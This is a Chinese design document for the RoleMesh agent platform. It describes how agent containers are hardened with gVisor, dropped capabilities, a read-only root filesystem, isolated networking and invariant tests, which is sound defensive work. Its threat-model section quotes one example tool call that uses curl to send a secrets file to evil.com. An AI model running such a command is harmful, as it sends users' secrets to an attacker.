# 容器加固架构

本文档介绍 RoleMesh 的容器加固模块（Container Hardening）——把 agent 容器从"裸 runc"提升到"业界主流多租户 AaaS 沙箱基线"所做的工作。

它涵盖为什么这一层是 agent 安全的地基、考虑过哪些备选并为何被否决、九条加固需求（R1-R9）各自解决什么问题，以及在实施中遇到的几个值得记下来的真实坑。

目标读者：将来扩展 agent 容器配置、引入新 runtime（如 Firecracker）、调试容器启动失败、或在新平台上部署 RoleMesh 的开发者。前置阅读：[`13-safety-overview.md`](13-safety-overview.md) 第 2.1 节。

---

## 背景：为什么裸 Docker 不够

RoleMesh 的 agent 容器执行的是 **LLM 生成的、用户输入影响的代码**——和传统跑业务微服务的容器有本质区别：

- Agent 可能跑 `Bash(command="curl evil.com -d @/workspace/secrets")`——你没法在编码期穷举所有"它会做什么"
- 多租户共享同一台宿主——一次容器逃逸 = 所有客户数据泄漏，是业务存亡问题
- LLM 输出经过 prompt injection 可能产生任意系统调用——必须假定容器内**任何代码**都可能执行

裸 Docker（runc + 默认配置）在这种场景下有几个关键不足：

1. **共享宿主 kernel**——一次 kernel CVE（Dirty Pipe、netfilter 漏洞）就能从容器穿到宿主
2. **默认拥有大量 capability**——容器内 root 实际接近宿主 root
3. **rootfs 可写**——攻击者落地后可以持久化后门、修改 `/usr/bin/` 投毒
4. **无资源默认上限**——一个失控 agent 能 OOM 整台机器或 fork bomb 耗尽 PID
5. **没有专用网络隔离**——所有容器在默认 bridge 上互通，metadata IP（`169.254.169.254`）可达
6. **`docker.sock` 一旦不小心挂载**——容器内立刻拿到宿主 root

每一条单独看都不致命，但叠加起来构成了"裸 Docker 不适合跑不可信代码"的共识。OpenAI Code Interpreter、AWS Lambda、Modal、E2B、Fly.io 都用了某种程度的加强方案——RoleMesh 也必须做。

---

## 设计目标

1. **业界主流多租户 AaaS 沙箱基线。** 不追求"绝对安全"，但要达到 OpenAI Code Interpreter 同级别的隔离强度。
2. **默认安全。** 配置层默认值就是"安全档"，运维需要显式 env 开关才能放宽，且日志告警。
3. **可平滑回退。** 任何加固都能通过 env 切回旧行为，便于排查问题时区分"是加固造成的"还是"是 agent 代码 bug"。
4. **零业务行为改变。** Agent 业务逻辑、tool 调用语义、对话流程完全不受影响。运维感知不到加固存在，除非主动看 `docker inspect`。
5. **跨平台一致。** macOS Docker Desktop、Linux 原生 Docker、Windows WSL 行为基本一致；不依赖只有某一种环境才有的特性。
6. **可观测。** 加固相关的所有限制都有结构化日志（带 `tenant_id`、`coworker_id`），便于事后审计。

---

## 已考虑的备选方案

### 方案 A——保持裸 runc + 完全依靠应用层防御

只在 agent 代码里加 prompt 防御（"不要执行危险命令"）、tool 白名单、阻断性安全规则。容器层不动。

**优点**：零部署改动，零兼容性风险。

**缺点**：一次 prompt injection 攻陷 = 容器内任意代码 = 完整宿主 kernel 攻击面暴露 = 多租户全部沦陷。"应用层防御" 在 agent 场景下不能作为唯一防线（[`13-safety-overview.md`](13-safety-overview.md) §5.2）。

**否决**——违背"defense in depth"原则。

### 方案 B——直接上 Firecracker microVM

每个 agent 跑在独立 KVM microVM 里，硬件级隔离。AWS Lambda、Fly.io Machines 的做法。

**优点**：隔离强度最高，CPU 侧信道也能防住。

**缺点**：
- 需要重写整个容器编排层（Docker → firecracker-containerd 或 Kata），工程量数月
- 启动时间 +500ms~1s（agent 场景能接受，但其他改动太多）
- 与现有 Docker 生态脱钩（volume、network、log 收集都要重做）
- 团队心智模型从"容器"变成"VM"，运维成本高

**否决（V1）**——为未来留口子。V2 真有合规客户要求硬件级隔离时再考虑。

### 方案 C——gVisor + Docker 内置加固选项（选中）

继续用 Docker / containerd 编排，把 OCI runtime 切换为 gVisor 的 `runsc`，同时把 Docker HostConfig 里所有安全选项打开（CapDrop、ReadonlyRootfs、Tmpfs、PidsLimit 等）。

**优点**：
- gVisor 用户空间 kernel 把宿主 kernel 攻击面缩到 ~20 个 syscall——拦住绝大多数 kernel CVE
- 改动量小：换 runtime 标志 + 配 HostConfig，2 天工作
- 完全兼容 Docker 生态——volume、network、log 不变
- 与 Google Cloud Run、OpenAI Code Interpreter 同一档隔离强度

**缺点**：
- gVisor 性能损耗 5-30%（IO 密集 workload 较明显）——但 agent 主要是 LLM 调用等待，CPU 不是瓶颈
- 少数 syscall 不支持——典型 Python/Node 工具链全部正常，需要的话可 per-coworker 退回 runc

**选中**——这是本文档其余部分描述的形态。

---

## 九条加固需求（R1-R9）

按"防御层级从内到外"组织。

### R1. OCI Runtime 可切换

| | |
|---|---|
| **配置** | `CONTAINER_OCI_RUNTIME=runc\|runsc`，per-coworker 可在 `coworkers.container_config.runtime` 覆盖 |
| **解决什么** | Kernel exploit 容器逃逸 |
| **关键决策** | Per-coworker 可覆盖——某些 super agent 受信任、跑高 IO 任务时可以用 runc 换性能；普通 agent 默认 runsc |

### R2. User Namespace Remap

| | |
|---|---|
| **配置** | dockerd 启用 userns-remap（部署级配置） |
| **解决什么** | 即使容器逃逸，容器内 root 在宿主视角是普通用户 |
| **关键决策** | 不在代码里强制（dockerd 守护进程级配置），但部署文档明确要求；代码侧拒绝 `Privileged=true` 和 host PID/IPC 命名空间，invariant 测试守护 |

### R3. Drop ALL Capabilities + Seccomp

| | |
|---|---|
| **配置** | `CapDrop=["ALL"]` + `no-new-privileges` + Docker 默认 seccomp profile + apparmor docker-default |
| **解决什么** | 容器内即使 root 也无法 `iptables`、`mount`、`ptrace`、改时间 |
| **关键决策** | 不维护自研 seccomp profile（运维成本高）；Docker 默认 profile 已经够窄 |

### R4. Read-only Rootfs + tmpfs

| | |
|---|---|
| **配置** | `ReadonlyRootfs=true`；`/tmp`（64MB）、`/home/agent/.cache`（64MB）、`/home/agent/.config`（8MB）、`/home/agent/.pi`（32MB）走 tmpfs |
| **解决什么** | 攻击者落地后无法持久化、无法修改系统文件投毒；容器重启即净 |
| **真实坑** | Claude Code CLI 默认写 `/home/agent/.claude.json`——需要 `CLAUDE_CONFIG_DIR` 重定向 + 持久化卷。强 readonly 之前必须 strace 跑一遍真实 agent task 枚举所有写路径，否则 SDK 静默失败难调试 |
| **补充设计** | 引入 `ErofsWatcher`——运行时监测 agent stderr 里的 `[Errno 30] Read-only file system` 报错并去重报警，提醒运维补 tmpfs 白名单 |

### R5. 独立网络 + Metadata Blackhole

| | |
|---|---|
| **配置** | Bridge network `rolemesh-agent-net`，`enable_icc=false`（容器间禁互通）；ExtraHosts blackhole `169.254.169.254` / `metadata.google.internal` |
| **解决什么** | 阻止 agent 通过云 metadata 偷 IAM 凭据；阻止租户间容器横向移动 |
| **关键决策** | EC-1 阶段（[`16-egress-control-architecture.md`](16-egress-control-architecture.md)）会把该网络改成 `--internal`，进一步切断到外网的物理路由——Container Hardening 阶段是基线，Egress Control 是升级 |
| **真实坑** | Linux 原生 Docker 上 `host.docker.internal` 需要 `host-gateway` 显式注入（dockerd ≥ 20.10）；container hardening 用 ExtraHosts 处理，验收必须在 Linux 原生 Docker 上跑通，不能只过 macOS Docker Desktop |

### R6. Docker Socket 守护

| | |
|---|---|
| **配置** | Invariant 测试扫描任意 spec 的 Binds，basename 等于 `docker.sock` 即拒绝 |
| **解决什么** | 一旦 `/var/run/docker.sock` 被挂入容器，容器内立刻拥有创建 privileged 容器、读取宿主文件系统的能力——等于送宿主 root |
| **关键决策** | 用 basename 精确匹配而非 substring（防误伤 `docker.socket-tests/foo` 这种合法路径）；测试横扫所有可能输入组合 |

### R7. 资源配额硬上限

| | |
|---|---|
| **配置** | Memory 默认 2g（上限 8g）、CPU 2.0（上限 4.0）、PidsLimit 512、`MemorySwap=Memory`（禁 swap） |
| **解决什么** | 死循环 OOM、fork bomb、swap 放大消耗磁盘 IO |
| **关键决策** | 全局上限**强制截断**——per-coworker 配置超过上限会被静默 clamp + 告警，不允许 admin 绕过 |

### R8. Env 白名单

| | |
|---|---|
| **配置** | 12 项 env 显式 allowlist：`TZ / NATS_URL / JOB_ID / AGENT_BACKEND / *_API_KEY / *_BASE_URL / CLAUDE_CODE_OAUTH_TOKEN / CLAUDE_CONFIG_DIR / HOME / PI_MODEL_ID` |
| **解决什么** | 防止宿主敏感 env（包括其他 agent 的 secret）泄漏到容器；防止 backend `extra_env` 随意注入未经审计的变量 |
| **关键决策** | `PATH / LANG / LC_ALL / PYTHONUNBUFFERED` **不进** allowlist——它们是镜像属性，应在 Dockerfile `ENV` 固定，不是租户级配置；启动日志只记 env **key**，不记 value |

### R9. Dockerfile 加固

| | |
|---|---|
| **配置** | UID 1000（非 root）；`LANG=C.UTF-8 LC_ALL=C.UTF-8 PYTHONUNBUFFERED=1` 固定；`HEALTHCHECK NONE` |
| **解决什么** | 容器内默认非 root；locale / Python buffer 不受宿主影响；不让 Docker 默认 healthcheck 多起一个 shell 进程 |
| **真实坑** | UID 最初设的是 10001（避开宿主用户 1000-1999 段），但与 dev 笔记本上 host 创建的 session 目录（owner=1000）冲突导致 EACCES——回到 1000 + 在 Dockerfile 长注释里说明"真要 UID 隔离请走 daemon 级 userns-remap"。这条决策的回滚理由必须保留在代码里，否则下一个 reviewer 会以为"为什么不用 10001 更安全"又改回去 |

---

## 架构

### 配置流

```
src/rolemesh/core/config.py       (CONTAINER_*  全局 env 配置)
        │
        ▼
src/rolemesh/core/types.py        (ContainerConfig  per-coworker 覆盖字段)
        │
        ▼
src/rolemesh/container/runner.py:build_container_spec()
        │ (合并全局默认 ← coworker override ← backend override
        │  + 硬上限截断 + 告警)
        ▼
src/rolemesh/container/runtime.py:ContainerSpec  (dataclass)
        │
        ▼
src/rolemesh/container/docker_runtime.py:_spec_to_config()
        │ (转 Docker HostConfig dict)
        ▼
aiodocker.containers.create()
```

### 网络拓扑（Container Hardening 阶段）

```
┌── 宿主机 ─────────────────────────────────────────────┐
│                                                       │
│  ┌── rolemesh-agent-net (bridge, ICC=false) ───────┐ │
│  │                                                  │ │
│  │   agent-coworker-A   agent-coworker-B   ...      │ │
│  │   （容器间不能互通）                              │ │
│  │                                                  │ │
│  │   ExtraHosts:                                    │ │
│  │     169.254.169.254 → 127.0.0.1                  │ │
│  │     metadata.google.internal → 127.0.0.1         │ │
│  │     host.docker.internal → host-gateway          │ │
│  │                                                  │ │
│  └──────────────────────────────────────────────────┘ │
│                          ↓                            │
│           credential_proxy（宿主进程, port 3001）      │
│                          ↓                            │
│                       互联网                          │
└───────────────────────────────────────────────────────┘
```

**注**：Egress Control 阶段会把此拓扑改成 DMZ 模式（agent network 变 `--internal`、proxy 容器化、新增 egress network）。详见 [`16-egress-control-architecture.md`](16-egress-control-architecture.md)。

### 启动顺序

`src/rolemesh/main.py` 中 orchestrator 启动时严格按以下顺序，任一失败拒绝接受流量：

1. `ensure_available()`——dockerd 版本门槛检查（≥ 20.10）
2. `ensure_agent_network()`——创建 / 验证 `rolemesh-agent-net`
3. `verify_proxy_reachable()`——临时探针容器测 `host.docker.internal:3001` 可达
4. `cleanup_orphans()`——清理上次崩溃残留容器
5. 接受流量

启动顺序在 `tests/container/test_startup_order.py` 钉死，防未来重构改乱。

---

## 取舍与边界

### 接受的取舍

- **gVisor 性能损耗 5-30%**：换来宿主 kernel 攻击面剧减。Agent 主要瓶颈是 LLM 调用延迟，CPU 不是关键。
- **多一个 NetworkMode + 启动顺序约束**：增加部署复杂度，换来 metadata blackhole + ICC 隔离。
- **失去某些调试便利**：read-only rootfs 让"进容器改文件试试"变得不可能，但这正是要的——攻击者也改不了。

### 明确不做（属于其他层或后续任务）

- **Egress proxy / URL allowlist** → Egress Control 模块
- **请求级访问控制** → Safety Framework
- **DNS exfiltration 防御** → Egress Control 模块
- **Firecracker / Kata** → V2 候选
- **运行时威胁检测（Falco）** → 监控层
- **镜像签名 / 漏洞扫描** → CI/CD 层

### 验证基线

加固后必须验证的最小集合（`tests/container/test_hardening_invariants.py` 中钉死）：

- `Privileged` 永不为 true
- `CapDrop` 永远含 `ALL`
- `SecurityOpt` 永远含 `no-new-privileges:true`
- `SecurityOpt` 不含 `seccomp=unconfined`
- 任何 mount 路径 basename 永不等于 `docker.sock`
- Env keys 永远是 allowlist 子集
- `MemorySwap` == `Memory`（禁 swap）

这些 invariant 横扫 200+ 配置组合（runtime × backend × mount × auth × UID），任一组合违反即测试失败。

---

## 一句话总结

**Container Hardening 把 RoleMesh agent 容器从"裸 runc" 提升到"业界主流多租户 AaaS 沙箱基线"**：gVisor 用户空间 kernel + 全能力剥离 + 只读 rootfs + tmpfs + 资源硬上限 + 独立网络 + metadata blackhole + docker.sock 守护 + env 白名单。

这一层是 [`13-safety-overview.md`](13-safety-overview.md) 中提到的"防御纵深"的**地基**——上面的 Safety Framework 和 Egress Control 都假定容器隔离已经做对了。地基有缺陷，上层防御都白做。
